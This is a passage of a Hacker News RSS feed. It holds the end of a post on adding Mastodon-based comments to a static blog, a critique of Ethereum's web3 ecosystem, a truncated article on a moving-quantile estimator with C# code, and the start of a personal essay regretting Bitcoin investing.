        <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>data</span><span>)</span> <span>{</span>
          <span>if</span><span>(</span><span>data</span><span>[</span><span>'descendants'</span><span>]</span> <span>&amp;&amp;</span>
             <span>Array</span><span>.</span><span>isArray</span><span>(</span><span>data</span><span>[</span><span>'descendants'</span><span>])</span> <span>&amp;&amp;</span> 
            <span>data</span><span>[</span><span>'descendants'</span><span>].</span><span>length</span> <span>&gt;</span> <span>0</span><span>)</span> <span>{</span>
              <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'mastodon-comments-list'</span><span>).</span><span>innerHTML</span> <span>=</span> <span>""</span><span>;</span>
              <span>data</span><span>[</span><span>'descendants'</span><span>].</span><span>forEach</span><span>(</span><span>function</span><span>(</span><span>reply</span><span>)</span> <span>{</span>
                <span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span> <span>=</span> <span>escapeHtml</span><span>(</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span><span>);</span>
                <span>reply</span><span>.</span><span>account</span><span>.</span><span>emojis</span><span>.</span><span>forEach</span><span>(</span><span>emoji</span> <span>=&gt;</span> <span>{</span>
                  <span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span> <span>=</span> <span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span><span>.</span><span>replace</span><span>(</span><span>`:</span><span>${</span><span>emoji</span><span>.</span><span>shortcode</span><span>}</span><span>:`</span><span>,</span>
                    <span>`&lt;img src="</span><span>${</span><span>escapeHtml</span><span>(</span><span>emoji</span><span>.</span><span>static_url</span><span>)</span><span>}</span><span>" alt="Emoji </span><span>${</span><span>emoji</span><span>.</span><span>shortcode</span><span>}</span><span>" height="20" width="20" /&gt;`</span><span>);</span>
                <span>});</span>
                <span>mastodonComment</span> <span>=</span>
                  <span>`&lt;div class="mastodon-comment"&gt;
</span><span>                     &lt;div class="avatar"&gt;
</span><span>                       &lt;img src="</span><span>${</span><span>escapeHtml</span><span>(</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>avatar_static</span><span>)</span><span>}</span><span>" height=60 width=60 alt=""&gt;
</span><span>                     &lt;/div&gt;
</span><span>                     &lt;div class="content"&gt;
</span><span>                       &lt;div class="author"&gt;
</span><span>                         &lt;a href="</span><span>${</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>url</span><span>}</span><span>" rel="nofollow"&gt;
</span><span>                           &lt;span&gt;</span><span>${</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span><span>}</span><span>&lt;/span&gt;
</span><span>                           &lt;span class="disabled"&gt;</span><span>${</span><span>escapeHtml</span><span>(</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>acct</span><span>)</span><span>}</span><span>&lt;/span&gt;
</span><span>                         &lt;/a&gt;
</span><span>                         &lt;a class="date" href="</span><span>${</span><span>reply</span><span>.</span><span>uri</span><span>}</span><span>" rel="nofollow"&gt;
</span><span>                           </span><span>${</span><span>reply</span><span>.</span><span>created_at</span><span>.</span><span>substr</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>)</span><span>}</span><span>
</span><span>                         &lt;/a&gt;
</span><span>                       &lt;/div&gt;
</span><span>                       &lt;div class="mastodon-comment-content"&gt;</span><span>${</span><span>reply</span><span>.</span><span>content</span><span>}</span><span>&lt;/div&gt; 
</span><span>                     &lt;/div&gt;
</span><span>                   &lt;/div&gt;`</span><span>;</span>
                <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'mastodon-comments-list'</span><span>).</span><span>appendChild</span><span>(</span><span>DOMPurify</span><span>.</span><span>sanitize</span><span>(</span><span>mastodonComment</span><span>,</span> <span>{</span><span>'RETURN_DOM_FRAGMENT'</span><span>:</span> <span>true</span><span>}));</span>
              <span>});</span>
          <span>}</span> <span>else</span> <span>{</span>
            <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'mastodon-comments-list'</span><span>).</span><span>innerHTML</span> <span>=</span> <span>"&lt;p&gt;Not comments found&lt;/p&gt;"</span><span>;</span>
          <span>}</span>
        <span>});</span>
      <span>});</span>
  <span>&lt;/</span><span>script</span><span>&gt;</span>
<span>&lt;/</span><span>div</span><span>&gt;</span>
{{ end }}
</code></pre></div><p>This code is using <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">DOMPurify</a>
to sanitize the input, since it is not a great idea to load data from
third party sources without sanitizing them first. Also thanks to
<a href="https://news.ycombinator.com/item?id=25575111" target="_blank" rel="noopener">chrismorgan</a>, the code
was optimized and is more secure.</p>
<p>In my blog post, I can now add the following information to my
frontmatter, to make comments appears magically.</p>
<div><pre><code data-lang="yaml"><span>comments</span><span>:</span><span>
</span><span>  </span><span>host</span><span>:</span><span> </span><span>linuxrocks.online</span><span>
</span><span>  </span><span>username</span><span>:</span><span> </span><span>carl</span><span>
</span><span>  </span><span>id</span><span>:</span><span> </span><span>105105837504372590</span><span>
</span></code></pre></div>
</section>


  
  <div>
    <h2>Comments</h2>
    <p>You can use your Mastodon account to reply to this <a href="https://linuxrocks.online/@carl/105463655803971969">post</a>.</p>
    <p><a href="https://linuxrocks.online/interact/105463655803971969?type=reply">Reply</a></p>
    
    
    
    
  </div>
  

  

  
</article></div>]]>
            </description>
            <link>https://carlschwan.eu/2020/12/29/adding-comments-to-your-static-blog-with-mastodon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570268</guid>
            <pubDate>Tue, 29 Dec 2020 14:57:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ethereum's Web3 Is Stupid]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25570259">thread link</a>) | @timdaub
<br/>
December 29, 2020 | https://timdaub.github.io/2020/09/08/web3/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2020/09/08/web3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>A long time ago, I gave a talk in front of a full audience talking about BigchainDB, a company I worked for to create a (scalable) decentralized database. As we just had released our browser-compatible JavaScript driver, enthusiastically, I told the audience: "... and so by using our driver from within the browser, your app won't need a backend anymore"!</p>
<p>That must have been around 2017 when I first discovered Metamask, and started drinking Ethereum's web3 cool-aid. Arguably, web3 quickly became something extraordinary. All of a sudden, users could download a browser extension and directly interact with a public network. In a sense, it still is extraordinary.</p>
<p>If you have an extension like Metamask installed in your browser today, you can visit sites on the web that allow you to do the craziest things with your digital money. An excellent recent example of this are DeFi (short for "Decentralized Finance") websites. They allow a user to engage in trading cryptocurrencies, providing liquidity, and peer to peer lending. With the click of a button and no mandatory signups, you're able to pool thousands of dollars. That is super cool and confirms the viability of the web3 vision.</p>
<p>But actually, what is the web3 vision? It may be that there never was such a thing in the first place. All I know is that someone named a library "web3.js". Developers use it to talk to remote or local Ethereum nodes when working in a browser environment (JavaScript).</p>
<p>On a web3-enabled website, when a user now clicks a button to, e.g., pool ether in a smart contract, most calculations are supported by the web3.js library that periodically talks to an Ethereum node. Ultimately web3.js allows the user to send the transaction to the node to transfer the user's money.</p>
<p>Often, a key-management program, like Metamask, is running on the user's browser. It allows the user to sign transactions with the same key on different websites.</p>
<p>In a nutshell, that's web3. It's supposed to be a play on words regarding "web 2.0". Web 2.0 is the upgrade of web standards that gave us modern single-page applications and dynamic AJAX loading. And Web3? An advancement towards what exactly? Money websites?</p>
<p>Indeed, if you were capable of cleaning your mind of specific memories, specifically, let's say you could do <code>grep -l web3 brain | xargs rm</code>. And then someone asked you how you'd envision a blockchain-based and smart-contract-enabled web3; you'd likely describe an ecosystem vastly different to what it is today. You'd think about peer-2-peer networks, light clients, and renewed web standards. That's precisely not web3.</p>
<p>In today's experience it will instead be mostly shitty react websites that crash or stop working when you've neglected to install Metamask (or other key-management plugins). Opening a web3 website's network console, you'll see that it's making an excessive amount of RPC request to an Ethereum full node. Sorry, I meant to say Infura node, a hugely-popular cloud provider hosting Ethereum full nodes. That's kinda stupid.</p>
<p>And since Metamask allows developers to prompt the user for specific contract calls, what's even more stupid, is that all your money may be at the risk of continually getting stolen with the accidential click of a button. Either by someone hacking the website's server. Or by the website provider becoming corrupt themselves. Or simply because a website pretends to do X when it does Y (stealing all your money).</p>
<p>But instead of continuing to rant, I'd now like to now point out what I think should change about web3:</p>
<ul>
<li>We should stop building key-management plugins and start thinking about a standardizable web API. We must stop training our users to install shitty browser plugins!</li>
<li>We need to make light clients work as soon as possible and become independent from third-party services like thegraph and Infura.</li>
<li>We need to improve our client libraries (ethers.js and web3.js) by dramatically simplifying them and making them bug-free (god damn it!)!</li>
<li>We need to take advantage of some of the blockchain's fundamental properties. Most data is immutable so let's start caching things.</li>
</ul>
<p>And finally, I think we should stop focusing all of our attention on bumping the web's version number. Maybe we should reconsider writing more backends. We should promote more work on permissionless networks like Open Gas Station Network that allow developers to upgrade a user's experience. And, we should start thinking of a machine network of blockchains more often. In many ways, web3 was just a cool demo. But let's come up with something better. Just imagine what happens once there's a deeper integration of money into computer systems!</p>

  </div></div>]]>
            </description>
            <link>https://timdaub.github.io/2020/09/08/web3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570259</guid>
            <pubDate>Tue, 29 Dec 2020 14:56:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fast moving median and quantile estimator]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25570117">thread link</a>) | @mzakharo1
<br/>
December 29, 2020 | https://aakinshin.net/posts/moving-quantile-doubleheap/ | <a href="https://web.archive.org/web/*/https://aakinshin.net/posts/moving-quantile-doubleheap/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span><time datetime="2020-12-29">December 29, 2020</time>
&nbsp;&nbsp;
<i></i>&nbsp;
<a href="https://aakinshin.net/tags/statistics/">Statistics</a>
<a href="https://aakinshin.net/tags/quantile/">Quantile</a>
<a href="https://aakinshin.net/tags/moving-quantile/">Moving Quantile</a></span></p><p>Imagine you have a time series.
Let’s say, after each new observation, you want to know an “average” value across the last <span>\(L\)</span> observations.
Such a metric is known as <a href="https://en.wikipedia.org/wiki/Moving_average">a moving average</a>
(or rolling/running average).</p><p>The most popular moving average example is <a href="https://en.wikipedia.org/wiki/Moving_average#Simple_moving_average">the moving mean</a>.
It’s easy to efficiently implement this metric.
However, it has a major drawback: it’s not robust.
Outliers can easily spoil the moving mean and transform it into a meaningless and untrustable metric.</p><p>Fortunately, we have a good alternative: <a href="https://en.wikipedia.org/wiki/Moving_average#Moving_median">the moving median</a>.
Typically, it generates a stable and smooth series of values.
In the below figure, you can see the difference between the moving mean and the moving median on noisy data.</p><div><div><a href="https://aakinshin.net/posts/moving-quantile-doubleheap/img/example-light.png" target="_blank" alt="example"><picture>
<source theme="dark" srcset="https://aakinshin.net/posts/moving-quantile-doubleheap/img/example-dark.png" media="(prefers-color-scheme: dark)"><source theme="light" srcset="https://aakinshin.net/posts/moving-quantile-doubleheap/img/example-light.png" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"><img width="800" src="https://aakinshin.net/posts/moving-quantile-doubleheap/img/example-light.png"></picture></a></div></div><p>The moving median also has a drawback: it’s not easy to efficiently implement it.
Today we going to discuss the Hardle-Steiger method to estimate the median
(memory: <span>\(O(L)\)</span>, element processing complexity: <span>\(O(log(L))\)</span>, median estimating complexity: <span>\(O(1)\)</span>).
Also, we will learn how to calculate <em>the moving quantiles</em> based on this method.</p><p>In this post, you will find the following:</p><ul><li>An overview of the Hardle-Steiger method</li><li>A simple way to implement the Hardle-Steiger method</li><li>Moving quantiles inspired by the Hardle-Steiger method</li><li>How to process initial elements</li><li>Reference C# implementation</li></ul><h3 id="an-overview-of-the-hardle-steiger-method">An overview of the Hardle-Steiger method</h3><p>This method is described in <a href="#Hardle1995">[Hardle1995]</a>.
The core idea is based on a data structure that contains two joined <a href="">heaps</a>:</p><div><p><a href="https://aakinshin.net/posts/moving-quantile-doubleheap/img/double-heap.svg" target="_blank" alt="double-heap"><img width="400" src="https://aakinshin.net/posts/moving-quantile-doubleheap/img/double-heap.svg"></a></p></div><p>In this figure, you see an example for <span>\(L=21\)</span>.
It contains:</p><ul><li><span>\(H_1 .. H_{10}\)</span>: min heap</li><li><span>\(H_{-1} .. H_{-10}\)</span>: max heap</li><li><span>\(H_0\)</span>: a node that joins two heaps</li></ul><p>The <span>\(H\)</span> array contain the last <span>\(L\)</span> elements of the time series and satisfy the following conditions:</p><ul><li><span>\(\max(H_{-2i},\; H_{-2i-1}) \leq H_{-i} \leq H_0\)</span></li><li><span>\(\min(H_{2i},\; H_{2i+1}) \geq H_{i} \geq H_0\)</span></li></ul><p>Thus, <span>\(H_0\)</span> is
less than all elements in the upper heap (positive indexes) and
greater than all elements in the lower heap (negative indexes).
Since we have an equal number of elements in both heaps,
<span>\(H_0\)</span> represents the median value.</p><p>That’s all!
If we want to know the current value of the moving median, we should just take the value of <span>\(H_0\)</span>.
The suggested algorithm has the following characteristics:</p><ul><li>Amount of memory: <span>\(O(L)\)</span></li><li>Element processing complexity: <span>\(O(log(L))\)</span></li><li>Median estimating complexity: <span>\(O(1)\)</span></li></ul><p>Now we should learn how to invalidate this data structure for new observations.</p><h3 id="a-simple-way-to-implement-the-hardle-steiger-method">A simple way to implement the Hardle-Steiger method</h3><p>The most famous implementation of the Hardle-Steiger method is the <a href="http://svn.r-project.org/R/trunk/src/library/stats/src/Trunmed.c">Turlach implementation</a> in C.
It’s used in the R’s function <a href="https://www.rdocumentation.org/packages/stats/versions/3.6.2/topics/runmed">runmed</a>.
This implementation doesn’t look simple, so it’s not easy to replicate it using another language
(you can find a few StackOverflow discussion about this implementation
<a href="https://stackoverflow.com/q/1309263/184842">here</a> and <a href="https://stackoverflow.com/q/5527437/184842">here</a>).
So, I looked at the above picture and came up with my own way to implement this algorithm
(you can find a reference C# implementation at the end of this post).
It differs from the Turlach implementation and from the suggested approach in the original paper,
but it still uses the same idea.</p><p>We are going to keep three array with numbers:</p><ul><li><code>double[] h</code>: the elements of the double-heap</li><li><code>int[] heapToElementIndex</code>: returns the original element index for the given heap element</li><li><code>int[] elementToHeapIndex</code>: returns the heap index for the given element index</li></ul><p>The swap routine is trivial:</p><div><pre><code data-lang="cs"><span>private</span> <span>void</span> <span>Swap</span><span>(</span><span>int</span> <span>heapIndex1</span><span>,</span> <span>int</span> <span>heapIndex2</span><span>)</span>
<span>{</span>
    <span>int</span> <span>elementIndex1</span> <span>=</span> <span>heapToElementIndex</span><span>[</span><span>heapIndex1</span><span>];</span>
    <span>int</span> <span>elementIndex2</span> <span>=</span> <span>heapToElementIndex</span><span>[</span><span>heapIndex2</span><span>];</span>
    <span>double</span> <span>value1</span> <span>=</span> <span>h</span><span>[</span><span>heapIndex1</span><span>];</span>
    <span>double</span> <span>value2</span> <span>=</span> <span>h</span><span>[</span><span>heapIndex2</span><span>];</span>

    <span>h</span><span>[</span><span>heapIndex1</span><span>]</span> <span>=</span> <span>value2</span><span>;</span>
    <span>h</span><span>[</span><span>heapIndex2</span><span>]</span> <span>=</span> <span>value1</span><span>;</span>
    <span>heapToElementIndex</span><span>[</span><span>heapIndex1</span><span>]</span> <span>=</span> <span>elementIndex2</span><span>;</span>
    <span>heapToElementIndex</span><span>[</span><span>heapIndex2</span><span>]</span> <span>=</span> <span>elementIndex1</span><span>;</span>
    <span>elementToHeapIndex</span><span>[</span><span>elementIndex1</span><span>]</span> <span>=</span> <span>heapIndex2</span><span>;</span>
    <span>elementToHeapIndex</span><span>[</span><span>elementIndex2</span><span>]</span> <span>=</span> <span>heapIndex1</span><span>;</span>
<span>}</span>
</code></pre></div><p>To simplify the calculations, we take all the element indexes by modulo <span>\(L\)</span>.
Since we have exactly <span>\(L\)</span> subsequent indexes at each moment,
there are no index collisions.</p><p>When we get a new element <code>x[i]</code>, we should replace the <code>h[i % L]</code> value by <code>x[i]</code>.
Next, we should do a series of swaps to repair the heap conditions.
In the classic heap implementation, we usually have two <code>Sift</code> methods: <code>SiftUp</code> and <code>SiftDown</code>.
To reduce the number of cases, we are going to implement a generic <code>Sift</code> routine according to the following scheme:</p><ul><li>Consider the current heap node and lower neighbor nodes.
If we have any lower neighbor nodes that are larger than the current node,
we swap the current node with the node that has the maximum value (across considered nodes).</li><li>Otherwise, we consider the current heap node and the upper neighbor nodes.
Repeat the previous step with an opposite sign.</li><li>If we swapped the current node with a lower or upper neighbor node,
we repeat two previous steps with the new node location.
Otherwise, we stop.</li></ul><p>This logic still have a lot of cases that should be handled,
but it’s not so hard to implement it.
See the reference implementation at the end of this post for details.</p><h3 id="moving-quantiles-inspired-by-the-hardle-steiger-method">Moving quantiles inspired by the Hardle-Steiger method</h3><p>The original algorithm was designed only for the moving median.
Let’s generalize it to calculate any moving quantile.</p><p>We can express the Hardle-Steiger method in terms of order statistics.
For the given odd <span>\(L\)</span>, we can define <span>\(k = (L-1)/2\)</span>.
The median element across the last <span>\(L\)</span> numbers is the <span>\((k+1)^\textrm{th}\)</span> smallest element (assuming one-base indexing).
<span>\(H_0\)</span> is the request number because it’s larger than all of the elements in the lower heap (which contains exactly <span>\(k\)</span> elements) and smaller than all of the elements in the upper heap (which also contains <span>\(k\)</span> elements).</p><p>Now let’s change the heap sizes!
For any <span>\(k \in [0; L-1]\)</span>, we can consider the lower heap of size <span>\(k\)</span> and the upper heap of size <span>\(L-k-1\)</span>.
In this case, <span>\(H_0\)</span> will represent the <span>\((k+1)^\textrm{th}\)</span> smallest element.
The <span>\(p^\textrm{th}\)</span> quantile (<span>\(p \in [0; 1]\)</span>) can be estimated as the <span>\(\lfloor p(L-1) \rfloor^\textrm{th}\)</span> smallest element!
Note that now the window size can be an arbitrary positive number
(unlike the original approach which supports only odd <span>\(L\)</span> values).</p><p>It looks simple, so I was surprised that I didn’t manage to find this idea anywhere.
If you find any references where this approach is explained, please let me know.</p><h3 id="how-to-process-initial-elements">How to process initial elements</h3><p>Let’s say that the windows size <span>\(L=21\)</span>, we estimate the median <span>\(k=10\)</span>,
but we are at the beginning of our time series, and we have only 13 elements.
What should we return?
There two possible strategies here:</p><ul><li><strong>Order Statistics</strong><br>Since the <span>\(k^\textrm{th}\)</span> smallest element was requested, we should return it.
In the above example, it would be the <span>\(10^\textrm{th}\)</span> smallest element from the 13 observed numbers.</li><li><strong>Quantile Approximation</strong><br>Since the median was requested, we should return it.
In the above example, it would be <span>\(7^\textrm{th}\)</span> smallest element from the 13 observed numbers.</li></ul><p>Also, there are other strategies (e.g., repeating the first element).
However, in my opinion, other approaches don’t satisfy the
<a href="https://en.wikipedia.org/wiki/Principle_of_least_astonishment">principle of least astonishment</a>,
so we are not going to discuss them.</p><p>The two presented strategy define the way of the heap initialization (how we process <span>\(x[i]\)</span> for <span>\(i &lt; L\)</span>).
We start with two empty heaps.
Once we got the first element, we always put it into <span>\(H_0\)</span>.
Next, we should add subsequent elements to the lower or upper heap depending on the chosen strategy:</p><ul><li><strong>Order Statistics</strong><br>We add elements to the lower heap until it’s full.
After that, we add elements to the upper heap.</li><li><strong>Quantile Approximation</strong><br>We choose the lower or upper heap trying to keep the ratio
<span>\(\textrm{LowerHeapSize} / (\textrm{LowerHeapSize} + \textrm{UpperHeapSize})\)</span>
close to the target quantile.</li></ul><h3 id="reference-c-implementation">Reference C# implementation</h3><p>Below you can find a full C# implementation of the moving quantile according to the above approach.
You can also use it with
the latest nightly version (0.3.0-nightly.81+) of <a href="https://github.com/AndreyAkinshin/perfolizer">Perfolizer</a>
(you need <code>DoubleHeapMovingQuantileEstimator</code>).</p><div><pre><code data-lang="cs"><span>/// &lt;summary&gt;
</span><span>/// A moving selector based on a double heap data structure.
</span><span>/// Memory: O(windowSize).
</span><span>/// Add complexity: O(log(windowSize)).
</span><span>/// GetValue complexity: O(1).
</span><span>/// 
</span><span>/// &lt;remarks&gt;
</span><span>/// Based on the following paper:
</span><span>/// Hardle, W., and William Steiger. "Algorithm AS 296: Optimal median smoothing." Journal of the Royal Statistical Society.
</span><span>/// Series C (Applied Statistics) 44, no. 2 (1995): 258-264.
</span><span>/// &lt;/remarks&gt;
</span><span>/// &lt;/summary&gt;
</span><span></span><span>public</span> <span>class</span> <span>DoubleHeapMovingQuantileEstimator</span>
<span>{</span>
    <span>private</span> <span>readonly</span> <span>int</span> <span>windowSize</span><span>,</span> <span>k</span><span>;</span>
    <span>private</span> <span>readonly</span> <span>double</span><span>[]</span> <span>h</span><span>;</span>
    <span>private</span> <span>readonly</span> <span>int</span><span>[]</span> <span>heapToElementIndex</span><span>;</span>
    <span>private</span> <span>readonly</span> <span>int</span><span>[]</span> <span>elementToHeapIndex</span><span>;</span>
    <span>private</span> <span>readonly</span> <span>int</span> <span>rootHeapIndex</span><span>,</span> <span>lowerHeapMaxSize</span><span>;</span>
    <span>private</span> <span>readonly</span> <span>MovingQuantileEstimatorInitStrategy</span> <span>initStrategy</span><span>;</span>
    <span>private</span> <span>int</span> <span>upperHeapSize</span><span>,</span> <span>lowerHeapSize</span><span>,</span> <span>totalElementCount</span><span>;</span>

    <span>public</span> <span>DoubleHeapMovingQuantileEstimator</span><span>(</span><span>int</span> <span>windowSize</span><span>,</span> <span>int</span> <span>k</span><span>,</span>
        <span>MovingQuantileEstimatorInitStrategy</span> <span>initStrategy</span> <span>=</span> <span>MovingQuantileEstimatorInitStrategy</span><span>.</span><span>QuantileApproximation</span><span>)</span>
    <span>{</span>
        <span>this</span><span>.</span><span>windowSize</span> <span>=</span> <span>windowSize</span><span>;</span>
        <span>this</span><span>.</span><span>k</span> <span>=</span> <span>k</span><span>;</span>
        <span>h</span> <span>=</span> <span>new</span> <span>double</span><span>[</span><span>windowSize</span><span>];</span>
        <span>heapToElementIndex</span> <span>=</span> <span>new</span> <span>int</span><span>[</span><span>windowSize</span><span>];</span>
        <span>elementToHeapIndex</span> <span>=</span> <span>new</span> <span>int</span><span>[</span><span>windowSize</span><span>];</span>

        <span>lowerHeapMaxSize</span> <span>=</span> <span>k</span><span>;</span>
        <span>this</span><span>.</span><span>initStrategy</span> <span>=</span> <span>initStrategy</span><span>;</span>
        <span>rootHeapIndex</span> <span>=</span> <span>k</span><span>;</span>
    <span>}</span>

    <span>private</span> <span>void</span> <span>Swap</span><span>(</span><span>int</span> <span>heapIndex1</span><span>,</span> <span>int</span> <span>heapIndex2</span><span>)</span>
    <span>{</span>
        <span>int</span> <span>elementIndex1</span> <span>=</span> <span>heapToElementIndex</span><span>[</span><span>heapIndex1</span><span>];</span>
        <span>int</span> <span>elementIndex2</span> <span>=</span> <span>heapToElementIndex</span><span>[</span><span>heapIndex2</span><span>];</span>
        <span>double</span> <span>value1</span> <span>=</span> <span>h</span><span>[</span><span>heapIndex1</span><span>];</span>
        <span>double</span> <span>value2</span> <span>=</span> <span>h</span><span>[</span><span>heapIndex2</span><span>];</span>

        <span>h</span><span>[</span><span>heapIndex1</span><span>]</span> <span>=</span> <span>value2</span><span>;</span>
        <span>h</span><span>[</span><span>heapIndex2</span><span>]</span> <span>=</span> <span>value1</span><span>;</span>
        <span>heapToElementIndex</span><span>[</span><span>heapIndex1</span><span>]</span> <span>=</span> <span>elementIndex2</span><span>;</span>
        <span>heapToElementIndex</span><span>[</span><span>heapIndex2</span><span>]</span> <span>=</span> <span>elementIndex1</span><span>;</span>
        <span>elementToHeapIndex</span><span>[</span><span>elementIndex1</span><span>]</span> <span>=</span> <span>heapIndex2</span><span>;</span>
        <span>elementToHeapIndex</span><span>[</span><span>elementIndex2</span><span>]</span> <span>=</span> <span>heapIndex1</span><span>;</span>
    <span>}</span>

    <span>private</span> <span>void</span> <span>Sift</span><span>(</span><span>int</span> <span>heapInde…</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aakinshin.net/posts/moving-quantile-doubleheap/">https://aakinshin.net/posts/moving-quantile-doubleheap/</a></em></p>]]>
            </description>
            <link>https://aakinshin.net/posts/moving-quantile-doubleheap/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570117</guid>
            <pubDate>Tue, 29 Dec 2020 14:40:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I wish I never bought Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25570070">thread link</a>) | @MYEUHD
<br/>
December 29, 2020 | https://www.quitfacebook.org/file/greed.html | <a href="https://web.archive.org/web/*/https://www.quitfacebook.org/file/greed.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p>But first, something completely different. Sometime in 2015 I caught wind of Elon Musk. There was something relatable in the way he spoke about being bullied, education <sup>(1)</sup>, and the future. His demeanor lit a spark that made me realign with myself, resurrecting my usual optimistic outlook. Further still, I became enamored by his companies which reinvigorated my long-lost curiosity and fascination with science. Waking up in the morning became exciting again; similar to my 10-year-old self during the summer: not a care in the world, ready to explore.</p>

    <p>Not being able to afford a Tesla car, the only way I could support him was through buying Tesla shares. So that's what I did, at the all-time high, right before it plummeted. In a fit of panic I wanted to sell, but the revolutionary workings of its cars and the Gigafactory, and their abundance of talent reassured me they were vastly ahead of the game. So I kept buying until the graph bottomed out, and soon enough my portfolio turned green. That the stock market closes at night and during the weekends made the whole experience tenable, more relaxed. But not for long.</p>

    <h2>“Drinking the Kool-Aid”</h2>
    <p>“is an expression used to refer to a person who believes in a possibly doomed or dangerous idea because of perceived potential high rewards.” <sup>(2)</sup></p>

    <p><img src="https://www.quitfacebook.org/file/media/kool-aid-man.png" alt="Kool-Aid man."></p><p>On Reddit I met a fellow Tesla fan who said his two most profitable investments were Tesla and bitcoin. Initially I didn't bother, but some three months later it reappeared. My motivations for investing had begun to shift. Primarily supporting a cause and secondarily making some money—beating inflation—traded places. Profit took precedence.</p>

    <p>At a price of $1200 and rising I drank the decentralized Kool-Aid. Each day I woke up richer—on paper. The increases that took Tesla several months happened overnight, and owning a million dollars grew less and less farfetched. “This is not a bubble. This time is different. We're at the start of the adoption curve.” Man, it felt good! In my naivety I dreamt about buying a house, or building a skate park named after bitcoin. I was high on “hopium” and living in a fantasy world. Gradually my time spent learning, reading, or developing real life skills decreased. Being rich became the ultimate goal and I merely had to sit back and watch. Then the bubble popped, “Kansas went bye-bye”.</p>

    <p>“If only I had done this or that” was my prevailing mode of thought, “I could've had so much more!” Although I never day traded, I did diversify, no, gamble into a handful of alternative coins in order to try my luck catching the next 400% price pump. No dice. I wasted so much time waiting for it “to moon” or trying to “catch falling knives” <sup>(3)</sup>. Not only were the results as succesful as dart throwing chimps <sup>(4)</sup>, it also significantly increased my anxiety. The regular stock market seldom impacted my day-to-day emotions, but the 24/7 cryptocurrency market did—more than I consciously realize or care to admit. At one point I had my intestines checked because my doctor feared cancer. Fortunately it was a false alarm, and the symptoms caused by a mild inflammation subsided when I stopped stress eating junk food. If only I listened to my body and did a U-turn at this point. Sadly, greed had taken over; I wanted to procure the same amount of profit as if I had never diversified.</p>

    <p>While the bear market was still in play I finished reading The Bitcoin Standard, the most revered book on bitcoin, promoting it as the best currency we've ever had. Still oblivious about its toxic community, and neglecting some of the book's historical inaccuracies, I assumed the content was credible and genuine since the author was a professor in economics. Moreover, after sending him a list of typos and errors he returned the favor by giving me access to his paywalled pdf files. To be able to help such an esteemed professor made me feel elated. I was ready to go all in, and I did. Selling my remaining Tesla shares at $290 at a loss to buy bitcoin at the bottom simultaneously marked my own rock-bottom, for I was dabbing in evil. Even though I was extremely lucky by having caught a falling knife an inch from the floor, I started rooting for a decline in the former and a surge in the latter. Imagine my saltiness when Tesla suddenly shot up to just shy of $1000. Bitcoin had risen as well, but it wasn't good enough. Dumbass.</p>

    <h2>“My precious!”</h2>
    <p><img src="https://www.quitfacebook.org/file/media/smeagol.jpg" alt="Smeagol or Gollum; Lord of the Rings."></p><p>“He hated the dark, and he hated light more: he hated everything, and the Ring most of all.” <br>
    “What do you mean?” said Frodo. “Surely the Ring was his Precious and the only thing he cared for? But if he hated it, why didn't he get rid of it, or go away and leave it?” <br>
    “You ought to begin to understand, Frodo, after all you have heard,” said Gandalf. “He hated it and loved it, as he hated and loved himself. He could not get rid of it. He had no will left in the matter.” —<a href="https://www.goodreads.com/book/show/33.The_Lord_of_the_Rings">“The Lord of the Rings”</a> by J.R.R. Tolkien</p>

    <p>Slowly I became like Gollum. Which is ironic because I love The Lord of the Rings for the exact opposite reasons: calling for adventure, exploration, to love your friends, and to live in harmony with nature. Instead I fell in love with “my precious”, sitting at home watching numbers, albeit in the comfort of a picturesque wallpaper. Bitcoin made me as selfish and greedy as the bankers it was supposed to be against.</p>

    <p>If not for skateboarding I wouldn't have stayed sane. It pulled me out of isolation and held my soul intact despite being otherwise bereft of life. Bitcoin's one redeeming quality, because it temporarily made me feel rich, was that I learned to spend more generously on things that merited it, like skateboarding or lichess.org <sup>(5)</sup>. Whereas before I tried saving on nearly everything.</p>

    <p>Fast-forward to some months before Covid-19. Something smelled fishy. Bitcoin's price had been rising, which was exciting, but some doubts arose about the aforementioned professor: Saifedean Ammous. I stumbled upon his Twitter profile… “What the fuck.” The amount of conspiratorial nonsense mixed with academically dishonest douchebaggery was flabbergasting. “Is this guy really a professor?” I gave him the benefit of the doubt until I emailed him regarding meat, a topic he regularly rants about. The full convo is available in the appendix, but here's a taste:</p>

    <p>“I need an echo chamber because the world is FULL of brainwashed malnourished clueless nuts like you”</p>

    <p>I'm not proud of my conversation with him, but the way he talked like a neglected pubescent brat taught me to assume good intentions yet scrutinize everyone; even if they have a PhD to their name. “Saifegate” severely shook my confidence: “If this guy wrote the most popular book on bitcoin, then what the fuck does the rest of its community consist of?”</p>

    <h2>Bitcoin is dead inside.</h2>
